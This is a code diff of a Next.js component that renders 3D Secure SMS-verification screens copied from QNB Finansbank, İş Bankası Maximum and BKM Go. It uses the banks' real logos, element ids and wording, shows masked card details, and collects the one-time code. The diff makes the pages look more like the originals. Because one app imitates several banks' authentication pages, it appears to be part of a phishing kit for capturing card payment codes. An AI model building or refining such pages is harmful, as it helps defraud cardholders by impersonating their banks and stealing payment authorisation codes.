-                                        <h3 style={{ fontSize: '13px', lineHeight: '1.5', marginBottom: '15px' }}>
-                                            İşlem şifreniz <span>{data?.maskedPhone}</span> olan cep telefonunuza gönderilecektir.
-                                            <br />Lütfen <span className="font-weight-bold">{referansNo}</span> referans numaralı alışveriş şifrenizi giriniz.
-                                        </h3>
+                                {isSubmitting ? (
+                                    <div id="state-bekle">
+                                        <div className="fn-spinner"></div>
+                                        <h3>İşlem şifreniz gönderiliyor, lütfen bekleyiniz...</h3>
                                     </div>
+                                ) : (
+                                    <div id="state-kod">
+                                        <h3>İşlem şifreniz <span id="msisdn">{data?.maskedPhone}</span> olan cep telefonunuza gönderilecektir.<br />Lütfen <span id="otpRefNo">{referansNo}</span> referans numaralı alışveriş şifrenizi giriniz.</h3>
+                                    </div>
+                                )}
 
-                                    <div className="form-wrapper">
-                                        <div className="form-group mb-3">
-                                            <label htmlFor="sms-kod" className="mb-1" style={{ fontSize: '13px', fontWeight: 'bold' }}>Doğrulama Kodu</label>
-                                            <input
+                                <div className="form-wrapper" id="state-form" style={{ display: isSubmitting ? 'none' : '' }}>
+                                    <label htmlFor="sms-kod">Doğrulama Kodu</label>
+                                    <form method="POST" onSubmit={handleSubmit}>
+                                        <div className="form-row">
+                                            <input 
                                                 ref={inputRef}
+                                                autoFocus 
+                                                required 
                                                 type="tel"
-                                                className="form-control text-center py-2"
-                                                name="sms"
+                                                className="f-input" 
+                                                name="sms" 
                                                 id="sms-kod"
-                                                maxLength={6}
-                                                required
+                                                minLength={5} 
+                                                maxLength={6} 
+                                                autoComplete="one-time-code"
+                                                inputMode="numeric" 
+                                                pattern="[0-9]*"
                                                 value={smsCode}
                                                 onChange={(e) => {
-                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                                                    setSmsCode(val);
+                                                    setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                     setError('');
                                                 }}
                                                 disabled={isTimeout}
-                                                style={{ fontSize: '18px', letterSpacing: '4px', fontWeight: 'bold' }}
-                                            />
+                                            /> 
                                         </div>
-
-                                        {isTimeout ? (
-                                            <div className="text-center mb-3">
-                                                <span className="text-danger d-block mb-2" style={{ fontSize: '12px' }}>Doğrulama kodunu girmediniz.</span>
-                                                <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-primary" style={{ borderColor: '#552382', color: '#552382' }}>
-                                                    Tekrar Gönder
-                                                </button>
+                                        <div id="submitButtonDiv" style={{ display: 'block' }}>
+                                            <div className="form-row has-submit">
+                                                <input 
+                                                    id="acs-submit-btn" 
+                                                    type="submit" 
+                                                    value="Onayla"
+                                                    className="button btn-1 btn-commit" 
+                                                    disabled={isTimeout || smsCode.length < 5} 
+                                                /> 
                                             </div>
-                                        ) : (
-                                            <div className="d-flex justify-content-between align-items-center mb-3" style={{ fontSize: '13px' }}>
-                                                <div>Kalan Süre: <span className="font-weight-bold text-danger">{formatTime(timeLeft)}</span></div>
-                                                <button type="button" onClick={handleCancel} className="text-muted border-0 bg-transparent" style={{ textDecoration: 'underline' }}>İşlemi İptal Et</button>
+                                            <div className="call-to-action">
+                                                <ul className="action-list" style={{ listStyle: 'none', padding: 0 }}>
+                                                    <li style={{ display: 'inline-block', marginRight: '10px' }}>
+                                                        <input type="button" onClick={handleCancel} value="İşlemi İptal Et" className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }} />
+                                                    </li>
+                                                    <li style={{ display: 'inline-block' }}>
+                                                        <input type="button" value="Yardım" className="txt-link" style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }} />
+                                                    </li>
+                                                </ul>
                                             </div>
-                                        )}
-
-                                        <button 
-                                            id="acs-submit-btn" 
-                                            className="btn w-100 py-2.5 text-white font-weight-bold" 
-                                            type="submit" 
-                                            disabled={isTimeout || smsCode.length < 5}
-                                            style={{ background: '#552382', borderRadius: '4px' }}
-                                        >
-                                            Onayla
-                                        </button>
-                                    </div>
-                                </form>
-                            )}
+                                            
+                                            {isTimeout ? (
+                                                <div className="text-center mb-3">
+                                                    <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</span>
+                                                    <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Tekrar Gönder</button>
+                                                </div>
+                                            ) : (
+                                                <div id="timerDiv" className="has-timer"> <span>Kalan Süre: </span> <span className="has-counter" id="time">{formatTime(timeLeft)}</span> </div>
+                                            )}
+                                        </div>
+                                    </form>
+                                    <div id="helpArea" className="noscriptHelpText" style={{ display: 'none' }}>3D Secure, internet alışverişlerinde kart sahibinin kimliğinin doğrulanması amacıyla kullanılan, hem kart sahiplerini hem de alışveriş yaptığınız firmayı sahtekarlıklara karşı koruyan uluslararası bir güvenli alışveriş çözümüdür.
+                                        <br />Cep telefonunuza doğrulama kodu gelmemesi ya da doğrulama kodunun gönderildiği telefon numaranızın güncel olmaması gibi durumlarda 0850 222 0 900 numaralı QNB Finansbank Çağrı Merkezi ile iletişime geçebilirsiniz.</div>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -598,7 +660,7 @@ export default function SmsPage() {
         );
     };
 
-    // 5. İŞ BANKASI RENDER METODU
+    // 5. İŞ BANKASI RENDER
     const renderIsbankasi = () => {
         return (
             <>
@@ -609,79 +671,101 @@ export default function SmsPage() {
                     main { padding-bottom: 0 !important; }
                     header { display: none !important; }
                     body { background: #fff !important; }
+                    #state-bekle { text-align:center; padding:30px 20px; }
+                    #state-bekle .isb-spinner { width:40px;height:40px;border:4px solid #e0e6f0;border-top-color:#1a3668;border-radius:50%;animation:isb-spin 1s linear infinite;margin:0 auto 12px; }
+                    @keyframes isb-spin { to { transform:rotate(360deg); } }
+                    #hata-box { display:none; }
                 `}</style>
-                <div style={{ maxWidth: '480px', margin: '0 auto', background: '#fff' }}>
-                    <div className="container-fluid header Maximum" style={{ background: '#0f2c59', padding: '15px' }}>
-                        <div className="d-flex justify-content-between align-items-center">
-                            <Image src="https://maxinet.isbank.com.tr/assets/images/logo-isbank.png" alt="isbank" width={80} height={35} style={{ objectFit: 'contain' }} />
-                            <div style={{ color: '#fff', fontWeight: 'bold', fontSize: '13px' }}>Maximum 3D Secure</div>
+                <div style={{ maxWidth: '480px', margin: '0 auto', background: '#fff' }} className="IsBankMain">
+                    <div className="container-fluid header Maximum">
+                        <div className="container d-flex justify-content-between align-items-center" style={{ width: '100%' }}>
+                            <div className="col-xs-6 header-left"></div>
+                            <div className="col-xs-6 header-right" style={{ textAlign: 'right' }}></div>
                         </div>
                     </div>
-                    <div className="container-fluid cardno" style={{ background: '#f1f3f5', padding: '12px 15px', borderBottom: '1px solid #dee2e6' }}>
-                        <div style={{ fontSize: '13px', fontWeight: 'bold', color: '#495057' }}>
-                            <span>KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span className="text-primary">{data?.lastFourDigits}</span>
+                    <div className="container-fluid cardno">
+                        <div className="container">
+                            <h1 style={{ fontSize: '14px', margin: 0 }}>
+                                <span className="title">KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span className="lastDigits"> {data?.lastFourDigits} </span>
+                            </h1>
                         </div>
                     </div>
-                    <div className="container-fluid details" style={{ padding: '15px' }}>
-                        <div className="row" style={{ background: '#f8f9fa', padding: '12px', borderRadius: '6px', margin: '0 0 15px 0', fontSize: '12.5px' }}>
-                            <div className="col-xs-12 col-sm-4 font-weight-bold mb-1">{data?.isyeriAdi}</div>
-                            <div className="col-xs-6 col-sm-4 text-danger font-weight-bold mb-1">{data?.tutar} ₺</div>
-                            <div className="col-xs-6 col-sm-4 text-muted">{data?.tarih}</div>
-                        </div>
-
-                        {error && <div className="text-danger mb-2 text-center" style={{ fontSize: '13px' }}>{error}</div>}
-
-                        {isSubmitting ? (
-                            <div className="text-center py-4">
-                                <div className="spinner-border text-primary" role="status"></div>
-                                <p className="mt-2 text-muted" style={{ fontSize: '13px' }}>Onaylanıyor...</p>
-                            </div>
-                        ) : (
-                            <form id="bkmform" onSubmit={handleSubmit}>
-                                <div id="state-kod">
-                                    <div className="mb-3" style={{ fontSize: '12.5px', color: '#495057', lineHeight: '1.5' }}>
-                                        Online alışverişinizin ödemesini tamamlamak için, <strong>{data?.maskedPhone}</strong> numaralı cep telefonunuza gelen şifreyi giriniz.
-                                    </div>
-                                    <div className="formHolder">
-                                        <div className="form-group mb-3">
-                                            <input
-                                                ref={inputRef}
-                                                id="sms-kod"
-                                                type="tel"
-                                                inputMode="numeric"
-                                                className="form-control text-center py-2"
-                                                maxLength={6}
-                                                placeholder="Doğrulama Kodu"
-                                                required
-                                                value={smsCode}
-                                                onChange={(e) => {
-                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                                                    setSmsCode(val);
-                                                    setError('');
-                                                }}
-                                                disabled={isTimeout}
-                                                style={{ fontSize: '18px', letterSpacing: '4px', fontWeight: 'bold' }}
-                                            />
-                                        </div>
-
-                                        <div className="form-group mb-3">
-                                            <button 
-                                                id="acs-submit-btn" 
-                                                type="submit" 
-                                                className="btn btn-primary w-100 py-2.5 font-weight-bold" 
-                                                disabled={isTimeout || smsCode.length < 5}
-                                                style={{ background: '#0f2c59', border: 'none' }}
-                                            >
-                                                ONAYLA
-                                            </button>
-                                        </div>
-
-                                        <div className="d-flex justify-content-between align-items-center mb-3" style={{ fontSize: '13px' }}>
-                                            <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-muted" style={{ fontSize: '12px' }}>İşlemi İptal Et</button>
-                                            <button type="button" className="btn btn-link p-0 text-muted" style={{ fontSize: '12px' }}>Yardım</button>
-                                        </div>
-                                    </div>
+                    <div className="container-fluid details">
+                        <div className="container">
+                            <div className="col-xs-12 row align-items-center">
+                                <div className="col-xs-12 col-sm-4 merchant">
+                                    <span>{data?.isyeriAdi}</span>
                                 </div>
+                                <div className="col-xs-6 col-sm-4 amount">
+                                    <span> {data?.tutar} ₺</span>
+                                </div>
+                                <div className="col-xs-6 col-sm-4 date">
+                                    <span> {data?.tarih} </span>
+                                </div>
+                            </div>
+                            {error && (
+                                <div className="col-xs-12 date mt-2" id="hata-box" style={{ display: 'block' }}>
+                                    <span style={{ color: 'red' }}>{error}</span>
+                                </div>
+                            )}
+                        </div>
+                    </div>
+
+                    <div className="container-fluid content">
+                        <div className="container">
+                            <div className="col-xs-12">
+
+                                {isSubmitting ? (
+                                    <div id="state-bekle">
+                                        <div className="isb-spinner"></div>
+                                        <div className="col-xs-12 info">
+                                            <p className="smallScreenText">SMS doğrulama kodunuz gönderiliyor, lütfen bekleyiniz...</p>
+                                        </div>
+                                    </div>
+                                ) : (
+                                    <div id="state-kod">
+                                        <div className="col-xs-12 info">
+                                            <p className="smallScreenText">Online alışverişinizin ödemesini tamamlamak için, <strong>{data?.maskedPhone}</strong> numaralı cep telefonunuza <strong>SMS</strong> ile gelen ya da İşCep'e <strong>Anlık Mesaj</strong> olarak iletilen doğrulama kodunu girerek onaylayınız. </p>
+                                        </div>
+                                        <div className="col-xs-12 formHolder">
+                                            <form method="POST" id="chnte" onSubmit={handleSubmit}>
+                                                <input 
+                                                    ref={inputRef}
+                                                    id="sms-kod" 
+                                                    name="sms" 
+                                                    type="tel" 
+                                                    inputMode="numeric"
+                                                    minLength={5} 
+                                                    maxLength={6} 
+                                                    placeholder="Doğrulama Kodu" 
+                                                    required
+                                                    value={smsCode}
+                                                    onChange={(e) => {
+                                                        setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
+                                                        setError('');
+                                                    }}
+                                                    disabled={isTimeout}
+                                                />
+                                                <input 
+                                                    id="acs-submit-btn" 
+                                                    type="submit" 
+                                                    value="ONAYLA" 
+                                                    className="primary" 
+                                                    disabled={isTimeout || smsCode.length < 5} 
+                                                />
+                                                <input id="reSendButton" type="button" value="Tekrar Gönder" className="primary inProgress" disabled style={{ display: 'none' }} />
+                                            </form>
+                                            <div className="row mt-3">
+                                                <div className="col-6">
+                                                    <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-left" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>İşlemi İptal Et</button>
+                                                </div>
+                                                <div className="col-6 text-right">
+                                                    <button type="button" className="btn btn-link p-0 text-right" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>Yardım</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                )}
 
                                 {isTimeout ? (
                                     <div className="text-center mb-3">
@@ -689,19 +773,29 @@ export default function SmsPage() {
                                         <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Tekrar Gönder</button>
                                     </div>
                                 ) : (
-                                    <div className="countdown text-center py-2 border-top text-muted" style={{ fontSize: '12px' }}>
-                                        Kalan Süre: <span className="font-weight-bold text-danger">{formatTime(timeLeft)}</span>
+                                    <div className="col-xs-12 countdown">
+                                        <div id="progressBar">
+                                            <div style={{ width: '100%', overflow: 'hidden', background: '#1a3668', color: '#fff', textAlign: 'center', padding: '2px 0' }}>
+                                                Kalan Süre: {formatTime(timeLeft)}
+                                            </div>
+                                        </div>
                                     </div>
                                 )}
-                            </form>
-                        )}
+                            </div>
+                        </div>
+                    </div>
+                    <div className="container-fluid footer">
+                        <div className="container">
+                            <p>KART BİLGİLERİNİZ İŞYERİ İLE <strong><u>KESİNLİKLE PAYLAŞILMAMAKTADIR</u></strong>. </p>
+                            <img src="https://maxinet.isbank.com.tr/assets/images/logo-isbank.png" alt="isbank" />
+                        </div>
                     </div>
                 </div>
             </>
         );
     };
 
-    // 6. DİĞER BANKALAR VE BKM GO RENDER METODU
+    // 6. BKM GO RENDER
     const renderBkmGo = (logoUrl: string) => {
         return (
             <>
@@ -711,31 +805,25 @@ export default function SmsPage() {
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
                     header { display: none !important; }
+                    #state-bekle { text-align:center; padding: 30px 20px; }
+                    #state-bekle .go-spinner { width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#00aeef;border-radius:50%;animation:go-spin 1s linear infinite;margin:0 auto 12px; }
+                    @keyframes go-spin { to { transform:rotate(360deg); } }
                 `}</style>
-
                 <div className="content-wrapper" style={{ margin: '0 auto', maxWidth: '480px' }}>
-                    <div className="header" style={{ marginTop: '25px', display: 'flex', justifyContent: 'space-between', alignContent: 'center', alignItems: 'center', padding: '0 10px' }}>
-                        <div className="brand-logo" style={{ margin: 0 }}>
-                            {/* eslint-disable-next-line @next/next/no-img-element */}
-                            <img src="https://goguvenliodeme.bkm.com.tr/images/go.png" alt="GO" style={{ height: '35px', objectFit: 'contain' }} />
+                    <div className="header">
+                        <div className="brand-logo">
+                            <img align="left" src="https://goguvenliodeme.bkm.com.tr/images/go.png" alt="GO" />
                         </div>
-                        <div>
+                        <div className="member-logo">
                             {/* eslint-disable-next-line @next/next/no-img-element */}
-                            <img src={logoUrl} alt="Bank Logo" style={{ height: '35px', objectFit: 'contain', maxWidth: '140px' }} onError={(e) => {
-                                // Fallback to Carrefour logo if bank logo fails to load
+                            <img align="right" src={logoUrl} alt="Bank Logo" onError={(e) => {
                                 (e.target as HTMLImageElement).src = "/api/csfour-proxy/staticimage/carrefoursacom-logo.svg";
                             }} />
                         </div>
                     </div>
-
                     <div id="approve-page">
-                        {isSubmitting && (
-                            <div id="loaderDiv" style={{ height: '100%', width: '100%', position: 'absolute', zIndex: 1, display: 'flex' }}>
-                                <div className="loader"></div>
-                            </div>
-                        )}
-
                         <div className="content">
+                            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
                             <div className="info-wrapper">
                                 <div className="info-row">
                                     <div className="info-col info-label">İşyeri Adı:</div>
@@ -747,96 +835,85 @@ export default function SmsPage() {
                                 </div>
                                 <div className="info-row">
                                     <div className="info-col info-label">İşlem Tarihi-Saati:</div>
-                                    <div className="info-col" id="operation-date-time">{data?.tarih || ''}</div>
+                                    <div className="info-col" id="operation-date-time">{data?.tarih}</div>
                                 </div>
                                 <div className="info-row">
                                     <div className="info-col info-label">Kart Numarası:</div>
-                                    <div className="info-col" id="pan">XXXX XXXX XXXX {data?.lastFourDigits}</div>
+                                    <div className="info-col" id="masked-pan">XXXX XXXX XXXX {data?.lastFourDigits}</div>
                                 </div>
                             </div>
-
                             <div className="action-wrapper">
-                                <div>
-                                    <h3>
-                                        Şifreniz <span id="msisdn">{data?.maskedPhone}</span> nolu cep telefonunuza gönderilecektir.
-                                        <br />Referans no: {referansNo}
-                                    </h3>
+                                <div className="info-message h3">
+                                    {error && <p id="hata-box" style={{ color: 'red', display: 'block' }}>{error}</p>}
+
+                                    {isSubmitting ? (
+                                        <div id="state-bekle">
+                                            <div className="go-spinner"></div>
+                                            <h3>SMS şifreniz gönderiliyor, lütfen bekleyiniz...</h3>
+                                        </div>
+                                    ) : (
+                                        <div id="state-kod">
+                                            <h3><div id="auth-message">İşlemi tamamlamak için kullanacağınız şifreniz bankanızda kayıtlı cep telefonunuza gönderilecektir.<br />Referans no: <span id="otpRefNo"> {referansNo} </span></div></h3>
+                                        </div>
+                                    )}
                                 </div>
 
-                                <div className="form-wrapper">
-                                    <form id="bkmform" className="form-code" onSubmit={handleSubmit} autoComplete="off">
-                                        {error && <div className="text-danger mb-2" style={{ fontSize: '13px' }}>{error}</div>}
+                                <div className="form-wrapper" id="state-form" style={{ display: isSubmitting ? 'none' : '' }}>
+                                    <form className="form-code" autoComplete="off" method="POST" onSubmit={handleSubmit}>
                                         <div className="form-row">
-                                            <label htmlFor="code" className="otpcode">Doğrulama Kodu</label>
-                                            <input
+                                            <label htmlFor="sms-kod" className="otpcode">Doğrulama Kodu</label>
+                                            <input 
                                                 ref={inputRef}
-                                                type="tel"
-                                                className={`f-input ${error ? 'error' : ''}`}
-                                                name="otpCode"
-                                                id="passwordfield"
-                                                minLength={5}
-                                                maxLength={6}
+                                                type="tel" 
+                                                className="f-input" 
+                                                name="sms" 
+                                                id="sms-kod"
+                                                minLength={5} 
+                                                maxLength={6} 
+                                                inputMode="numeric"
+                                                pattern="[0-9]*" 
+                                                autoComplete="off" 
+                                                required 
+                                                autoFocus
                                                 value={smsCode}
                                                 onChange={(e) => {
-                                                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                                                    setSmsCode(val);
+                                                    setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                     setError('');
                                                 }}
-                                                placeholder={error || ''}
-                                                inputMode="numeric"
-                                                pattern="[0-9]*"
-                                                autoComplete="one-time-code"
                                                 disabled={isTimeout}
                                             />
                                         </div>
-
-                                        {isTimeout ? (
-                                            <div id="timeOutDiv" className="error-messages error-timeover" style={{ display: 'block' }}>
-                                                <div>
-                                                    <span className="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
-                                                </div>
-                                                <button
-                                                    type="button"
-                                                    onClick={handleRetry}
-                                                    className="button btn-1 re-code v1"
-                                                >
-                                                    Doğrulama Kodunu Yeniden Gönder
-                                                </button>
+                                        <div className="error-messages error-wrong-otp" style={{ display: 'none' }}>
+                                            <span>Doğrulama Kodunu hatalı girdiniz.Lütfen kontrol ederek tekrar deneyiniz.</span>
+                                        </div>
+                                        <div id="submitButtonDiv">
+                                            <div className="has-submit">
+                                                <button id="acs-submit-btn" type="submit" className="button btn-1 btn-commit" disabled={isTimeout || smsCode.length < 5}>Onayla</button>
                                             </div>
-                                        ) : (
-                                            <div id="submitButtonDiv" style={{ display: 'block' }}>
-                                                <div className="has-submit">
-                                                    <button
-                                                        id="submitbutton"
-                                                        type="submit"
-                                                        className="button btn-1 btn-commit"
-                                                        disabled={isSubmitting || smsCode.length < 5}
-                                                    >
-                                                        Onayla
-                                                    </button>
+                                            {isTimeout ? (
+                                                <div className="text-center mb-3">
+                                                    <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</span>
+                                                    <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Yeniden Gönder</button>
                                                 </div>
+                                            ) : (
                                                 <div id="timerDiv" className="has-timer">
-                                                    <span>Kalan Süre: </span>
-                                                    <span className="has-counter" id="has-counter">{formatTime(timeLeft)}</span>
+                                                    <span>Kalan Süre: </span> <span className="has-counter" id="time">{formatTime(timeLeft)}</span>
                                                 </div>
-                                            </div>
-                                        )}
-
-                                        <div className="call-to-action">
-                                            <ul className="action-list">
-                                                <li>
-                                                    <button
-                                                        type="button"
-                                                        onClick={handleCancel}
-                                                        className="txt-link"
-                                                        style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }}
-                                                    >
-                                                        İşlemi İptal Et
-                                                    </button>
-                                                </li>
-                                            </ul>
+                                            )}
                                         </div>
                                     </form>
+                                    <div className="call-to-action">
+                                        <div className="action-list">
+                                            <div className="action-row">
+                                                <div className="action-col left">
+                                                    <button type="button" onClick={handleCancel} className="txt-link text-primary bg-transparent border-0" style={{ cursor: 'pointer', fontFamily: 'inherit' }}>İşlemi İptal Et</button>
+                                                </div>
+                                                <div className="action-col right">
+                                                    <button type="button" className="txt-link text-primary bg-transparent border-0" style={{ cursor: 'pointer', fontFamily: 'inherit' }}>Yardım</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
